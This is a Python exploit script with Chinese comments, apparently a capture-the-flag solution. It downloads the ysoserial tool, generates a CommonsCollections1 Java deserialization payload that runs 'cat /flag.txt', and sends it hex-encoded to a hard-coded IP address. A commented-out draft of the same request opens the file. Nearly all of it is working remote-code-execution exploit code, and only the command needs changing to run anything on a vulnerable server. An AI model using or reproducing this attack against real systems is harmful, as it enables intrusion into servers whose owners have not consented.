# import requests        # 导入requests库申请书

# url=" http://103.85.23.250:8080/basic  "             # 发送请求的地址  例url="http://9eu5dpp.haobachang.loveli.com.cn:8888/check"
# # http://103.85.23.250:8080/basic?data=hex(serializedData)
# headers = {            # 编写请求头
# "Host": "103.85.23.250:8080",   # 请求的地址  例"Host":"9eu5dpp.haobachang.loveli.com.cn:8888"
# "Upgrade-Insecure-Requests": "1",
# "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
# "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
# "Accept-Encoding": "gzip, deflate",
# "Accept-Language": "zh-CN,zh;q=0.9",
# }
# serializedData=
# payload=hex(serializedData)
# params={"data": payload}#替换请求参数中的data值为payload 

# response = requests.get(url=url,params=params,headers=headers,)  #发送请求（get请求）

# print(response.status_code)  # 获取响应状态码
# print(response.headers)  # 获取响应头
# print(response.content)  # 获取响应内容


import requests
import subprocess
import os
import base64

# 目标URL（移除多余空格）
url = "http://103.85.23.250:8080/basic"

# 请求头
headers = {
    "Host": "103.85.23.250:8080",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

# 1. 生成恶意序列化数据（执行命令读取flag）
def generate_serialized_data():
    # 检查ysoserial是否存在
    if not os.path.exists("ysoserial.jar"):
        print("[*] 正在下载ysoserial工具...")
        try:
            import urllib.request
            urllib.request.urlretrieve(
                "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar",
                "ysoserial.jar"
            )
            print("[+] 下载完成")
        except:
            print("[!] 自动下载失败，请手动下载: https://github.com/frohoff/ysoserial/releases")
            exit(1)
    
    # 要执行的命令（读取flag）
    command = "cat /flag.txt"
    
    # 生成序列化数据
    print(f"[*] 生成执行命令的序列化数据: {command}")
    try:
        result = subprocess.run(
            ["java", "-jar", "ysoserial.jar", "CommonsCollections1", command],
            capture_output=True,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] 生成失败: {e.stderr.decode()}")
        exit(1)

# 2. 主程序
if __name__ == "__main__":
    # 生成序列化数据
    serializedData = generate_serialized_data()
    
    # 转换为十六进制字符串
    payload = serializedData.hex()
    print(f"[*] 序列化数据大小: {len(serializedData)} 字节")
    print(f"[*] 十六进制长度: {len(payload)} 字符")
    
    # 发送请求
    params = {"data": payload}
    print("[*] 发送请求到目标服务器...")
    response = requests.get(url=url, params=params, headers=headers)
    
    # 输出结果
    print("\n===== 响应结果 =====")
    print(f"状态码: {response.status_code}")
    print(f"响应头: {dict(response.headers)}")
    
    print(f"响应内容：{response.content}")  # 获取响应内容

    # # 尝试解码响应内容
    # try:
    #     content = response.content.decode('utf-8')
    # except:
    #     content = str(response.content)
    
    # print("\n响应内容:")
    # print(content)
    
    # # 保存响应到文件
    # with open("response.html", "w", encoding="utf-8") as f:
    #     f.write(content)
    # print("\n[+] 响应已保存到 response.html")